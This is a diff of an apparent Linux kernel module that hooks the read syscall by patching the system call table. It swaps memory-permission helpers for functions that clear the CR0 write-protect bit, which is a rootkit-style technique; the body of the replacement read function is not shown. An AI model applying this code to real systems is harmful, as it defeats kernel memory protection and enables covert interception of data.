@@ -13,17 +13,19 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/sched.h>
-#include <asm/cacheflush.h>
+#include <asm/paravirt.h>
 #include "sysmap.h"
 
-int set_page_rw(void* _addr)
+void disable_ro(void)
 {
-    return set_memory_rw((uintptr_t)_addr, 1);
+    write_cr0(read_cr0() & ~X86_CR0_WP);
+    barrier();
 }
 
-int set_page_ro(void* _addr)
+void enable_ro(void)
 {
-    return set_memory_ro((uintptr_t)_addr, 1);
+    write_cr0(read_cr0() | X86_CR0_WP);
+    barrier();
 }
 
 #define syscalls ((void**)SM_sys_call_table)
@@ -42,17 +44,17 @@ int fake_read(int fd, void* buf, size_t count)
 
 void hook_read(void)
 {
-    set_page_rw(syscalls);
+    disable_ro();
     old_read_func = syscalls[__NR_read];
     syscalls[__NR_read] = fake_read;
-    set_page_ro(syscalls);
+    enable_ro();
 }
 
 void unhook_read(void)
 {
-    set_page_rw(syscalls);
+    disable_ro();
     syscalls[__NR_read] = old_read_func;
-    set_page_ro(syscalls);
+    enable_ro();
 }
 
 int init_module(void){
